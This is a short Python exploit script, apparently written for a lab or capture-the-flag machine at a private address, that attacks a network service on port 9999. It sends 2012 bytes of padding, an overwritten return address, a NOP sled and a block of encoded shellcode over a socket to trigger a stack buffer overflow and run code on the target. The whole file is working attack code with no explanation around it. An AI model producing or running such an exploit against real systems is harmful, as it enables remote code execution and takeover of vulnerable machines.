#!/usr/bin/python3
import socket
ip = "10.10.126.34"

port = 9999
timeout = 5
prefix = b""
offset = 2012
NOP = b"\x90" * 20
buf =  b""
buf += b"\xba\xaf\x55\x13\xb3\xda\xc6\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\xf9\x5b\xf1"
buf += b"\x46\xf9\x8c\x77\xa8\x01\x4d\x18\x20\xe4\x7c\x18\x56"
buf += b"\x6d\x2e\xa8\x1c\x23\xc3\x43\x70\xd7\x50\x21\x5d\xd8"
buf += b"\xd1\x8c\xbb\xd7\xe2\xbd\xf8\x76\x61\xbc\x2c\x58\x58"
buf += b"\x0f\x21\x99\x9d\x72\xc8\xcb\x76\xf8\x7f\xfb\xf3\xb4"
buf += b"\x43\x70\x4f\x58\xc4\x65\x18\x5b\xe5\x38\x12\x02\x25"
buf += b"\xbb\xf7\x3e\x6c\xa3\x14\x7a\x26\x58\xee\xf0\xb9\x88"
buf += b"\x3e\xf8\x16\xf5\x8e\x0b\x66\x32\x28\xf4\x1d\x4a\x4a"
buf += b"\x89\x25\x89\x30\x55\xa3\x09\x92\x1e\x13\xf5\x22\xf2"
buf += b"\xc2\x7e\x28\xbf\x81\xd8\x2d\x3e\x45\x53\x49\xcb\x68"
buf += b"\xb3\xdb\x8f\x4e\x17\x87\x54\xee\x0e\x6d\x3a\x0f\x50"
buf += b"\xce\xe3\xb5\x1b\xe3\xf0\xc7\x46\x6c\x34\xea\x78\x6c"
buf += b"\x52\x7d\x0b\x5e\xfd\xd5\x83\xd2\x76\xf0\x54\x14\xad"
buf += b"\x44\xca\xeb\x4e\xb5\xc3\x2f\x1a\xe5\x7b\x99\x23\x6e"
buf += b"\x7b\x26\xf6\x21\x2b\x88\xa9\x81\x9b\x68\x1a\x6a\xf1"
buf += b"\x66\x45\x8a\xfa\xac\xee\x21\x01\x27\x1b\xbd\x38\x46"
buf += b"\x73\xc3\x3a\xb9\xd8\x4a\xdc\xd3\xf0\x1a\x77\x4c\x68"
buf += b"\x07\x03\xed\x75\x9d\x6e\x2d\xfd\x12\x8f\xe0\xf6\x5f"
buf += b"\x83\x95\xf6\x15\xf9\x30\x08\x80\x95\xdf\x9b\x4f\x65"
buf += b"\xa9\x87\xc7\x32\xfe\x76\x1e\xd6\x12\x20\x88\xc4\xee"
buf += b"\xb4\xf3\x4c\x35\x05\xfd\x4d\xb8\x31\xd9\x5d\x04\xb9"
buf += b"\x65\x09\xd8\xec\x33\xe7\x9e\x46\xf2\x51\x49\x34\x5c"
buf += b"\x35\x0c\x76\x5f\x43\x11\x53\x29\xab\xa0\x0a\x6c\xd4"
buf += b"\x0d\xdb\x78\xad\x73\x7b\x86\x64\x30\x9b\x65\xac\x4d"
buf += b"\x34\x30\x25\xec\x59\xc3\x90\x33\x64\x40\x10\xcc\x93"
buf += b"\x58\x51\xc9\xd8\xde\x8a\xa3\x71\x8b\xac\x10\x71\x9e"

returnAdd = b"\xdf\x14\x50\x62"

buffer = b"A" * 2012 + returnAdd + NOP + buf




s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
resp = s.recv(1024)
print(resp)

s.send(b"test" + b"\r\n")
s.send(buffer + b"\r\n")
resp = s.recv(1024)
print(resp)

s.close()	